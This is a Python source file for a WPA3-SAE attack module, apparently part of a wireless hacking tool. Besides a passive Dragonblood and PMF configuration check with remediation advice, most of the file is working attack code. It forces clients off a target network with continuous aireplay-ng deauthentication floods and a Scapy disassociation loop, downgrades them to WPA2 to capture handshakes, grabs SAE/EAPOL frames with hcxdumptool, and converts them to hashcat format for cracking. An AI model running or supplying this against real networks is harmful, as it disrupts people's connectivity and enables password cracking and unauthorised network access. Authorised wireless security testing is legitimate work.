"""
WPA3-SAE attack module with Dragonblood vulnerability detection.

Attack strategies:
1. Transition mode downgrade (WPA3 → WPA2) — most reliable
2. SAE handshake capture via hcxdumptool
3. Dragonblood vulnerability scanning (passive detection)
"""

import os
import re
import signal
import subprocess
import threading
import time
from datetime import datetime


class WPA3Attack:
    """WPA3-SAE attacks and Dragonblood vulnerability detection."""

    # SAE groups and their vulnerability status
    WEAK_GROUPS = {
        22: {"bits": 1024, "type": "MODP", "risk": "high", "cve": "CVE-2019-13377"},
        23: {"bits": 2048, "type": "MODP", "risk": "high", "cve": "CVE-2019-13377"},
        24: {"bits": 2048, "type": "MODP", "risk": "high", "cve": "CVE-2019-13377"},
        1:  {"bits": 256,  "type": "ECP",  "risk": "medium", "cve": "Small subgroup"},
        2:  {"bits": 384,  "type": "ECP",  "risk": "medium", "cve": "Small subgroup"},
    }
    SECURE_GROUPS = {19, 20, 21}

    def __init__(self, log_fn=None):
        self.log_fn = log_fn
        self.running = False
        self._proc = None
        self._thread = None
        self.result = None
        self.progress = ""
        self.lock = threading.Lock()

    def _log(self, level, message):
        if self.log_fn:
            self.log_fn(level, f"[wpa3] {message}")

    # ─── Dragonblood Vulnerability Scan ──────────────────────────────────

    def check_dragonblood(self, bssid, interface, channel=None) -> dict:
        """
        Passive Dragonblood vulnerability assessment.
        Analyzes beacon frames for weak SAE configurations.
        Returns vulnerability report.
        """
        self._log("info", f"Dragonblood scan on {bssid}")

        report = {
            "bssid": bssid,
            "vulnerable": False,
            "risk_level": "none",
            "vulnerabilities": [],
            "weak_groups": [],
            "transition_mode": False,
            "pmf_required": False,
            "recommendations": [],
        }

        # Set channel if provided
        if channel:
            subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)],
                           capture_output=True, timeout=5)

        # Capture beacon frames from target
        try:
            from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt

            beacons = sniff(
                iface=interface,
                filter=f"ether src {bssid}",
                timeout=10,
                count=5,
                monitor=True,
                store=True,
            )

            for pkt in beacons:
                if not pkt.haslayer(Dot11Beacon):
                    continue

                # Parse RSN Information Element
                rsn_info = self._parse_rsn(pkt)
                if rsn_info:
                    report.update(self._analyze_rsn(rsn_info))
                break

        except Exception as e:
            self._log("error", f"Beacon capture failed: {e}")
            # Fallback: use airodump-ng output to detect WPA3
            report["vulnerabilities"].append("Could not capture beacon for detailed analysis")

        # Check transition mode via airodump fallback (only if beacon didn't detect it)
        if not report["transition_mode"]:
            report["transition_mode"] = self._check_transition_mode(bssid, interface)

        # Assess risk based on all findings
        if report["transition_mode"]:
            report["vulnerable"] = True
            if "risk_level" not in report or report["risk_level"] == "none":
                report["risk_level"] = "high"
            if not any("Transition Mode" in v for v in report.get("vulnerabilities", [])):
                report["vulnerabilities"].append(
                    "WPA3 Transition Mode: network accepts both WPA2 and WPA3. "
                    "Clients can be downgraded to WPA2 for handshake capture."
                )
            if "Disable WPA2 compatibility" not in str(report.get("recommendations", [])):
                report["recommendations"].append("Disable WPA2 compatibility — use WPA3-only mode")

        if not report.get("pmf_required", False):
            report["vulnerable"] = True
            # PMF optional on a WPA3 network is always high risk
            if report["risk_level"] == "none":
                report["risk_level"] = "high"
            if not any("PMF" in v for v in report.get("vulnerabilities", [])):
                report["vulnerabilities"].append(
                    "PMF optional — deauthentication attacks possible"
                )
            if "Enable mandatory PMF" not in str(report.get("recommendations", [])):
                report["recommendations"].append("Enable mandatory PMF (802.11w)")

        self._log("info", f"Dragonblood scan complete: risk={report['risk_level']}")
        return report

    def _parse_rsn(self, pkt):
        """Parse RSN (Robust Security Network) IE from beacon."""
        try:
            from scapy.all import Dot11Elt
            elt = pkt.getlayer(Dot11Elt)
            while elt:
                if elt.ID == 48:  # RSN IE
                    return self._decode_rsn_ie(elt.info)
                elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
        except Exception:
            pass
        return None

    def _decode_rsn_ie(self, data):
        """Decode RSN Information Element bytes."""
        if len(data) < 10:
            return None
        try:
            import struct
            offset = 0
            version = struct.unpack_from("<H", data, offset)[0]
            offset += 2

            # Group cipher
            group_cipher = data[offset:offset+4]
            offset += 4

            # Pairwise cipher count and suites
            pw_count = struct.unpack_from("<H", data, offset)[0]
            offset += 2
            pairwise = []
            for _ in range(pw_count):
                pairwise.append(data[offset:offset+4])
                offset += 4

            # AKM count and suites
            akm_count = struct.unpack_from("<H", data, offset)[0]
            offset += 2
            akm_suites = []
            for _ in range(akm_count):
                akm_suites.append(data[offset:offset+4])
                offset += 4

            # RSN capabilities
            capabilities = struct.unpack_from("<H", data, offset)[0] if offset + 2 <= len(data) else 0

            # AKM type detection
            # OUI 00:0F:AC type 8 = SAE, type 2 = PSK
            has_sae = any(s[3] == 8 for s in akm_suites if len(s) == 4 and s[:3] == b'\x00\x0f\xac')
            has_psk = any(s[3] == 2 for s in akm_suites if len(s) == 4 and s[:3] == b'\x00\x0f\xac')

            # PMF (Protected Management Frames)
            mfp_capable = bool(capabilities & 0x80)
            mfp_required = bool(capabilities & 0x40)

            return {
                "version": version,
                "has_sae": has_sae,
                "has_psk": has_psk,
                "transition_mode": has_sae and has_psk,
                "mfp_capable": mfp_capable,
                "mfp_required": mfp_required,
                "akm_suites": akm_suites,
            }
        except Exception:
            return None

    def _analyze_rsn(self, rsn_info):
        """Analyze RSN info for vulnerabilities."""
        result = {
            "pmf_required": rsn_info.get("mfp_required", False),
            "transition_mode": rsn_info.get("transition_mode", False),
        }

        vulns = []

        if rsn_info.get("transition_mode"):
            vulns.append("WPA3 Transition Mode detected — downgrade attack possible")
            result["risk_level"] = "high"
            result["vulnerable"] = True

        if rsn_info.get("mfp_capable") and not rsn_info.get("mfp_required"):
            vulns.append("PMF optional — deauthentication attacks possible")

        if not rsn_info.get("mfp_required"):
            result["recommendations"] = result.get("recommendations", [])
            result["recommendations"].append("Enable mandatory PMF (802.11w)")

        result["vulnerabilities"] = vulns
        return result

    def _check_transition_mode(self, bssid, interface):
        """Quick check if network supports both WPA2 and WPA3."""
        try:
            result = subprocess.run(
                ["airodump-ng", "--bssid", bssid, "--write-interval", "1",
                 "-w", "/tmp/wpa3check", "--output-format", "csv",
                 interface],
                capture_output=True, text=True, timeout=8
            )
        except Exception:
            pass

        # Check the CSV for SAE + PSK
        try:
            with open("/tmp/wpa3check-01.csv", "r") as f:
                content = f.read()
                if "SAE" in content and "PSK" in content:
                    return True
        except Exception:
            pass

        # Cleanup
        for ext in [".csv", ".cap", ".kismet.csv", ".kismet.netxml", ".log.csv"]:
            try:
                os.remove(f"/tmp/wpa3check-01{ext}")
            except OSError:
                pass

        return False

    # ─── SAE Handshake Capture ───────────────────────────────────────────

    def start_capture(self, bssid, interface, channel=None, method="auto",
                      secondary_interface=None) -> tuple:
        """
        Start WPA3-SAE attack.
        method: "auto", "downgrade", "sae_capture", "passive"
        secondary_interface: for dual-adapter deauth while capturing
        Returns (success, message).
        """
        if self.running:
            return False, "Attack already running"

        self.running = True
        self.result = None
        self.progress = ""

        self._thread = threading.Thread(
            target=self._run_attack,
            args=(bssid, interface, channel, method, secondary_interface),
            daemon=True
        )
        self._thread.start()
        return True, f"WPA3 {method} attack started on {bssid}"

    def _run_attack(self, bssid, interface, channel, method, secondary_interface):
        """Execute the WPA3 attack strategy."""
        try:
            if channel:
                subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)],
                               capture_output=True, timeout=5)

            if method == "auto":
                # Try downgrade first, then SAE capture
                self._log("info", "Auto mode: checking for transition mode...")
                with self.lock:
                    self.progress = "Checking transition mode..."

                is_transition = self._check_transition_mode(bssid, interface)
                if is_transition:
                    self._log("info", "Transition mode detected — using downgrade attack")
                    self._attack_downgrade(bssid, interface, channel, secondary_interface)
                else:
                    self._log("info", "WPA3-only — using SAE handshake capture")
                    self._attack_sae_capture(bssid, interface, channel, secondary_interface)

            elif method == "downgrade":
                self._attack_downgrade(bssid, interface, channel, secondary_interface)
            elif method == "sae_capture":
                self._attack_sae_capture(bssid, interface, channel, secondary_interface)
            elif method == "passive":
                self._attack_passive(bssid, interface, channel)

        except Exception as e:
            self._log("error", f"WPA3 attack error: {e}")
            with self.lock:
                self.result = {"error": str(e)}
        finally:
            with self.lock:
                self.running = False

    def _disassoc_loop(self, interface, bssid, clients):
        """Send disassociation frames via Scapy (same as Monitor tab's _disassoc_loop)."""
        try:
            from scapy.all import (
                Dot11, Dot11Disas, RadioTap, sendp, conf
            )

            while self.running:
                # Broadcast disassoc
                pkt_broadcast = (
                    RadioTap() /
                    Dot11(type=0, subtype=10, addr1="ff:ff:ff:ff:ff:ff",
                          addr2=bssid, addr3=bssid) /
                    Dot11Disas(reason=7)
                )
                try:
                    sendp(pkt_broadcast, iface=interface, count=16,
                          inter=0.01, verbose=False)
                except Exception:
                    pass

                # Per-client disassoc
                for client in clients:
                    if not self.running:
                        break
                    pkt_client = (
                        RadioTap() /
                        Dot11(type=0, subtype=10, addr1=client,
                              addr2=bssid, addr3=bssid) /
                        Dot11Disas(reason=7)
                    )
                    try:
                        sendp(pkt_client, iface=interface, count=8,
                              inter=0.01, verbose=False)
                    except Exception:
                        pass

                time.sleep(0.1)
        except Exception as e:
            self._log("error", f"Disassoc loop error: {e}")

    def _check_handshake(self, cap_path):
        """Check if a cap file contains a valid handshake. Returns True if found."""
        if not os.path.isfile(cap_path):
            return False
        try:
            check = subprocess.run(
                ["aircrack-ng", cap_path],
                capture_output=True, text=True, timeout=10,
                input="q\n"
            )
            return bool(re.search(r"\(\s*[1-9]\d*\s+handshake", check.stdout))
        except Exception:
            return False

    def _attack_downgrade(self, bssid, interface, channel, secondary_interface):
        """Transition mode downgrade: force clients to use WPA2, capture handshake."""
        with self.lock:
            self.progress = "Downgrade: starting capture..."

        cap_file = f"data/wpa3_downgrade_{bssid.replace(':', '')}"
        cap_path = f"{cap_file}-01.cap"

        # Start airodump-ng to capture handshake
        cap_proc = subprocess.Popen(
            ["airodump-ng", "--bssid", bssid, "-c", str(channel or 0),
             "-w", cap_file, "--output-format", "pcap", interface],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )

        deauth_iface = secondary_interface or interface
        deauth_procs = []
        time.sleep(3)  # Let airodump settle

        try:
            with self.lock:
                self.progress = "Downgrade: discovering clients..."

            # Discover connected clients first (quick 8s scan)
            clients = set()
            try:
                disc_proc = subprocess.run(
                    ["airodump-ng", "--bssid", bssid, "-c", str(channel or 0),
                     "--output-format", "csv", "-w", "/tmp/wpa3_disc",
                     "--write-interval", "2", deauth_iface],
                    capture_output=True, text=True, timeout=8
                )
            except subprocess.TimeoutExpired:
                pass
            try:
                with open("/tmp/wpa3_disc-01.csv", "r") as f:
                    in_clients = False
                    for line in f:
                        if "Station MAC" in line:
                            in_clients = True
                            continue
                        if in_clients:
                            parts = line.strip().split(",")
                            if len(parts) >= 6 and ":" in parts[0]:
                                mac = parts[0].strip()
                                assoc_bssid = parts[5].strip() if len(parts) > 5 else ""
                                if bssid.lower() in assoc_bssid.lower():
                                    clients.add(mac)
            except Exception:
                pass
            # Cleanup discovery files
            for ext in [".csv", ".cap", ".kismet.csv", ".kismet.netxml", ".log.csv"]:
                try:
                    os.remove(f"/tmp/wpa3_disc-01{ext}")
                except OSError:
                    pass

            self._log("info", f"Downgrade: found {len(clients)} client(s): {clients}")

            with self.lock:
                self.progress = f"Downgrade: deauthing ({len(clients)} clients)..."

            # 1. Broadcast deauth — 2 processes (same as Monitor tab)
            for _ in range(2):
                proc = subprocess.Popen(
                    ["aireplay-ng", "--deauth", "0", "-a", bssid,
                     "--ignore-negative-one", "-D", deauth_iface],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT
                )
                deauth_procs.append(proc)

            # 2. Per-client targeted deauth (the key difference)
            for client_mac in clients:
                proc = subprocess.Popen(
                    ["aireplay-ng", "--deauth", "0", "-a", bssid,
                     "-c", client_mac, "--ignore-negative-one", "-D", deauth_iface],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT
                )
                deauth_procs.append(proc)

            # 3. Scapy disassoc loop in background thread
            disassoc_thread = threading.Thread(
                target=self._disassoc_loop,
                args=(deauth_iface, bssid, clients),
                daemon=True
            )
            disassoc_thread.start()

            self._log("info", f"Downgrade: {len(deauth_procs)} deauth procs + disassoc loop on {bssid}")

            # Poll for handshake every 3 seconds, up to 120 seconds
            for i in range(40):
                if not self.running:
                    break

                time.sleep(3)

                with self.lock:
                    self.progress = f"Downgrade: deauthing... {(i+1)*3}s elapsed"

                if self._check_handshake(cap_path):
                    break

            # Report result
            if self._check_handshake(cap_path):
                with self.lock:
                    self.progress = "Handshake captured!"
                    self.result = {
                        "method": "downgrade",
                        "cap_file": cap_path,
                        "message": "WPA2 handshake captured via downgrade attack",
                    }
                self._log("info", f"Downgrade success — handshake in {cap_path}")
            elif self.result is None:
                with self.lock:
                    self.result = {"error": "Downgrade: no handshake captured (120s). Ensure a client is connected to the target."}

        finally:
            # Kill all deauth processes
            for proc in deauth_procs:
                try:
                    proc.kill()
                    proc.wait(timeout=3)
                except Exception:
                    pass

            # Kill airodump
            try:
                cap_proc.send_signal(signal.SIGTERM)
                cap_proc.wait(timeout=5)
            except Exception:
                try:
                    cap_proc.kill()
                except Exception:
                    pass

    def _try_convert_pcapng(self, pcapng_file, hash_file):
        """Try to convert pcapng to hashcat format. Returns True if hash file created."""
        try:
            conv = subprocess.run(
                ["hcxpcapngtool", "-o", hash_file, pcapng_file],
                capture_output=True, text=True, timeout=10
            )
            if os.path.isfile(hash_file) and os.path.getsize(hash_file) > 0:
                return True
        except FileNotFoundError:
            self._log("warning", "hcxpcapngtool not installed — cannot convert to hashcat format. Install: sudo apt install hcxtools")
        except Exception as e:
            self._log("error", f"Conversion failed: {e}")
        return False

    def _attack_sae_capture(self, bssid, interface, channel, secondary_interface):
        """Capture SAE handshake using hcxdumptool."""
        with self.lock:
            self.progress = "SAE capture: starting hcxdumptool..."

        # Check if hcxdumptool is available
        hcx_available = subprocess.run(
            ["which", "hcxdumptool"], capture_output=True
        ).returncode == 0

        if not hcx_available:
            self._log("warning", "hcxdumptool not installed — falling back to downgrade")
            self._attack_downgrade(bssid, interface, channel, secondary_interface)
            return

        conv_available = subprocess.run(
            ["which", "hcxpcapngtool"], capture_output=True
        ).returncode == 0

        if not conv_available:
            self._log("warning", "hcxpcapngtool not installed — will capture but cannot convert. Install: sudo apt install hcxtools")

        pcapng_file = f"data/wpa3_sae_{bssid.replace(':', '')}.pcapng"
        hash_file = f"data/wpa3_sae_{bssid.replace(':', '')}.22000"

        # Build BPF filter for target BSSID
        bpf_file = "/tmp/hcx_bpf.bpf"
        bpf_expr = f"wlan addr3 {bssid.replace(':', '').lower()}"
        try:
            subprocess.run(
                ["hcxdumptool", f"--bpfc={bpf_expr}"],
                capture_output=True, timeout=5,
                stdout=open(bpf_file, "w")
            )
        except Exception:
            bpf_file = None

        # Determine channel with band suffix (hcxdumptool v7 format)
        ch_arg = None
        if channel:
            band = "a" if int(channel) <= 14 else "b"
            ch_arg = f"{channel}{band}"

        # hcxdumptool manages monitor mode itself — interface must be in managed mode
        # Disable monitor mode if active
        try:
            subprocess.run(["ip", "link", "set", interface, "down"],
                           capture_output=True, timeout=5)
            subprocess.run(["iw", "dev", interface, "set", "type", "managed"],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", interface, "up"],
                           capture_output=True, timeout=5)
        except Exception:
            pass

        try:
            cmd = ["hcxdumptool", "-i", interface, "-w", pcapng_file, "--rds=1"]
            if ch_arg:
                cmd += ["-c", ch_arg]
            if bpf_file:
                cmd += [f"--bpf={bpf_file}"]
            # Exit automatically on first EAPOL M1M2 (4=M1M2 not authorized, 2=M1M2M3)
            cmd += ["--exitoneapol=6", "--tot=3"]  # 3 minute timeout

            self._log("info", f"hcxdumptool cmd: {' '.join(cmd)}")

            self._proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )

            # Poll for completion
            for i in range(36):  # 3 minutes
                if not self.running:
                    break
                with self.lock:
                    self.progress = f"SAE capture: {(i+1)*5}s elapsed — listening..."
                time.sleep(5)

                # hcxdumptool exits on its own when it captures EAPOL
                if self._proc.poll() is not None:
                    self._log("info", "hcxdumptool exited — checking capture")
                    break

                # Also check if file has data
                if os.path.isfile(pcapng_file) and os.path.getsize(pcapng_file) > 500:
                    if conv_available and self._try_convert_pcapng(pcapng_file, hash_file):
                        break

            # Try final conversion
            if self.result is None and os.path.isfile(pcapng_file) and os.path.getsize(pcapng_file) > 100:
                if conv_available and self._try_convert_pcapng(pcapng_file, hash_file):
                    with self.lock:
                        self.result = {
                            "method": "sae_capture",
                            "hash_file": hash_file,
                            "pcapng_file": pcapng_file,
                            "message": "SAE handshake captured — crack with: hashcat -m 22000",
                        }
                    self._log("info", f"SAE handshake captured: {hash_file}")
                elif not conv_available:
                    with self.lock:
                        self.result = {
                            "method": "sae_capture",
                            "pcapng_file": pcapng_file,
                            "message": f"Capture saved to {pcapng_file} — install hcxpcapngtool to convert: sudo apt install hcxtools",
                        }

            if self.result is None:
                with self.lock:
                    self.result = {"error": "SAE capture: no EAPOL handshake captured. Ensure a client reconnects during capture."}

        finally:
            if self._proc and self._proc.poll() is None:
                self._proc.send_signal(signal.SIGTERM)
                try:
                    self._proc.wait(timeout=5)
                except Exception:
                    self._proc.kill()
                self._proc = None

            for f in [bpf_file]:
                try:
                    if f:
                        os.remove(f)
                except OSError:
                    pass

    def _attack_passive(self, bssid, interface, channel):
        """Passive SAE capture — no deauth, wait for natural reconnections."""
        with self.lock:
            self.progress = "Passive: waiting for client reconnections..."

        pcapng_file = f"data/wpa3_passive_{bssid.replace(':', '')}.pcapng"
        hash_file = f"data/wpa3_passive_{bssid.replace(':', '')}.22000"

        hcx_available = subprocess.run(
            ["which", "hcxdumptool"], capture_output=True
        ).returncode == 0

        if not hcx_available:
            with self.lock:
                self.result = {"error": "hcxdumptool required for passive SAE capture. Install: sudo apt install hcxdumptool"}
            return

        conv_available = subprocess.run(
            ["which", "hcxpcapngtool"], capture_output=True
        ).returncode == 0

        if not conv_available:
            self._log("warning", "hcxpcapngtool not installed — will capture but cannot convert. Install: sudo apt install hcxtools")

        # Build BPF filter
        bpf_file = "/tmp/hcx_bpf_passive.bpf"
        bpf_expr = f"wlan addr3 {bssid.replace(':', '').lower()}"
        try:
            subprocess.run(
                ["hcxdumptool", f"--bpfc={bpf_expr}"],
                capture_output=True, timeout=5,
                stdout=open(bpf_file, "w")
            )
        except Exception:
            bpf_file = None

        # Channel with band suffix
        ch_arg = None
        if channel:
            band = "a" if int(channel) <= 14 else "b"
            ch_arg = f"{channel}{band}"

        # hcxdumptool needs managed mode — restore interface
        try:
            subprocess.run(["ip", "link", "set", interface, "down"],
                           capture_output=True, timeout=5)
            subprocess.run(["iw", "dev", interface, "set", "type", "managed"],
                           capture_output=True, timeout=5)
            subprocess.run(["ip", "link", "set", interface, "up"],
                           capture_output=True, timeout=5)
        except Exception:
            pass

        try:
            cmd = ["hcxdumptool", "-i", interface, "-w", pcapng_file,
                   "--rds=1",
                   "--disable_disassociation",  # passive — no transmit
                   "--associationmax=0",         # don't try to associate
                   "--exitoneapol=6",            # exit on M1M2
                   "--tot=5"]                    # 5 minute timeout
            if ch_arg:
                cmd += ["-c", ch_arg]
            if bpf_file:
                cmd += [f"--bpf={bpf_file}"]

            self._log("info", f"Passive hcxdumptool: {' '.join(cmd)}")

            self._proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )

            # Poll for up to 5 minutes
            for i in range(60):
                if not self.running:
                    break
                with self.lock:
                    self.progress = f"Passive: {(i+1)*5}s — waiting for reconnection..."
                time.sleep(5)

                if self._proc.poll() is not None:
                    self._log("info", "hcxdumptool exited — checking capture")
                    break

                if os.path.isfile(pcapng_file) and os.path.getsize(pcapng_file) > 500:
                    if conv_available and self._try_convert_pcapng(pcapng_file, hash_file):
                        break

            # Final conversion attempt
            if self.result is None and os.path.isfile(pcapng_file) and os.path.getsize(pcapng_file) > 100:
                if conv_available and self._try_convert_pcapng(pcapng_file, hash_file):
                    with self.lock:
                        self.result = {
                            "method": "passive",
                            "hash_file": hash_file,
                            "pcapng_file": pcapng_file,
                            "message": "SAE handshake captured passively — crack with: hashcat -m 22000",
                        }
                    self._log("info", f"Passive SAE capture: {hash_file}")
                elif not conv_available:
                    with self.lock:
                        self.result = {
                            "method": "passive",
                            "pcapng_file": pcapng_file,
                            "message": f"Capture saved to {pcapng_file} — install hcxpcapngtool to convert: sudo apt install hcxtools",
                        }

            if self.result is None:
                with self.lock:
                    self.result = {"error": "Passive: no SAE handshake within timeout. Try disconnecting/reconnecting a device."}

        finally:
            if self._proc and self._proc.poll() is None:
                self._proc.send_signal(signal.SIGTERM)
                try:
                    self._proc.wait(timeout=5)
                except Exception:
                    self._proc.kill()
                self._proc = None
            for f in [bpf_file]:
                try:
                    if f:
                        os.remove(f)
                except OSError:
                    pass

    def stop(self):
        """Stop running attack."""
        self.running = False
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGTERM)
                self._proc.wait(timeout=5)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass
            self._proc = None
        self._log("info", "WPA3 attack stopped")

    def get_status(self) -> dict:
        """Return attack status."""
        with self.lock:
            return {
                "running": self.running,
                "progress": self.progress,
                "result": self.result,
            }
